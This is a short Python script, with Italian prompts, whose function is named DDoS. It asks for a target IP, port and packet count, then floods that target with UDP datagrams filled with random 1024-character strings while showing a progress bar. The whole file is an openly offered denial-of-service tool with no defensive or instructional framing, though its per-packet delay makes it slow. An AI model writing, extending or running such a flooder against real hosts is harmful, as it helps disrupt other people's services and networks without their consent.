import socket
import random
import time

def Genera_pass(len_pass: int):
    return ''.join([random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnm#.,+-')) for C in range(len_pass)])

def DDoS(IP_target,Port,N_t_send):
      client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      print(f'connecting to {IP_target} port {Port}')
      client_socket.connect((IP_target, Port))
      for i in range(N_t_send):
            percentuale = (i + 1) / N_t_send
            barra = '#' * int(percentuale * 20)
            print('\r[{:<20}] {:.0%}'.format(barra, percentuale), end='')
            client_socket.sendall(Genera_pass(1024).encode())  
            time.sleep(0.1) # Simula il tempo necessario per eseguire un'operazione
      print('\nclosing socket')
      client_socket.close()

if __name__=="__main__":
    IP_target=input("inserire l'IP target: ")
    Port=int(input("Inserire la porta"))
    N_t_send=int(input("numero Pacchetti da inviare: "))
    DDoS(IP_target,Port,N_t_send)


    
